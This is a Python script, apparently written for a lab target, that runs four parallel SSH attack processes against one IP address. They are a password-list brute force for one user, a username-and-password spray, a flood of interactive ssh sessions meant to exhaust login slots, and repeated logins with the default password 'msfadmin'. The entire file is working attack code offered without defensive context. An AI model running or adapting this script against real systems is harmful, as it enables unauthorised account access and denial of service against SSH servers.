#import paramiko
from pwn import *
import multiprocessing
import time
import os
#import os
#itr=1
ip="10.10.10.13"
logingracetimer=3
loginpassword="msfadmin"
#usualyfor the loops,could be overwritten as different files have different lengths
def prong1(uname,pfile):
    #print(pfile) took the variable filename of password
    pptr=open(pfile,"r")
    #created envcheckpy
    #print(os.system("wc -l " + pfile))
    #print(uname) constant username to be shot with
    #print(pptr.readline()) shows the pptr is working fine
    for pwd in pptr.readlines():
        pwd=pwd.rstrip()
        try:
            conn=ssh(host=ip, user=uname, password=pwd)
            #conn close is required because to close the connection and to proceed
            conn.close()
        except:
            print("strike 1")
    pptr.close()
    #print(pwd)
    #print(pwd)
    #print(pwd[-1]) this shows that the last element is now a word of pwd not ending with a whitespace or space


#if on compile time i take out the number of statements in the file, wont be effective..
#check on the bash script if the uname and pfile is different error out there and then
def prong2(ufile,pfile):
    pptr=open(pfile,"r")
    uptr=open(ufile,"r")
    for pwd in pptr.readlines():
        pwd=pwd.rstrip()
        #print(pwd,M.H)
        for unm in uptr.readlines():
            unm=unm.rstrip()
            #print(unm)
            try:
                conn=ssh(host=ip, user=unm, password=pwd)
                conn.close()
            except:
                print("strike 2")
        #need to set back the pointer to read the unm file again..
        uptr.seek(0)
    pptr.close()
    uptr.close()



def prong3(ufile,htimer):
    #will shoot the os cmd to bash , wil not background it as bg process gets terminated if they require input from terminal
    uptr=open(ufile,"r")
    for usr in uptr.readlines():
        usr=usr.rstrip()
        #print(usr)
        try:
            #print("ssh " + usr + "@" + ip)
            #will not be sedning the op to /dev/null as the inputting stream from terminal can be thrown
            print("strike 3")
            os.system("ssh " + usr + "@" + ip)
            #time.sleep(htimer)
        except:
            #print("Tout err")
            #print("strike 3")
            pass
    uptr.close()

def prong4(ufile,pwd):
    #this prong is not an inactive yet authenticated session but just a authenticated session and exited via close
    uptr=open(ufile,"r")
    for usr in uptr.readlines():
        usr=usr.rstrip()
        #print(usr)
        try:
            print("strike 4")
            conn=ssh(host=ip, user=usr, password=pwd)
            conn.close()
        except:
            pass
    uptr.close()

#prong1("check","password_file.txt")
#prong2("username_file.txt","password_file.txt")
#prong3("username_file.txt",logingracetimer)
#prong4("username_file.txt",loginpassword)

#MULTIPROCESSING REAL CONCURRENT RUNNING WITH SEPARATE MEMORY ALLOCATION RATHER THAN MULTITHREADING 
#WHICH JUST GIVES AN ILLUSION OF RUNNING CONCURRENTLY ALTHOUGH ITS CONTEXT SWITCHING BETWEEN THE THREADS

if __name__ == "__main__":

    mp1=multiprocessing.Process(target=prong1, args=("check","password_file.txt"))
    mp2=multiprocessing.Process(target=prong2, args=("username_file.txt","password_file.txt"))
    mp3=multiprocessing.Process(target=prong3, args=("username_file.txt",logingracetimer))
    mp4=multiprocessing.Process(target=prong4, args=("username_file.txt",loginpassword))

    mp1.start()
    mp2.start()
    mp3.start()
    mp4.start()
    
    #print("diff processes id: " + str(mp1.pid) + "   " + str(mp2.pid) + "  " + str(mp3.pid) + "  " + str(mp4.pid)) 

    mp1.join()
    mp2.join()
    mp3.join()
    mp4.join()
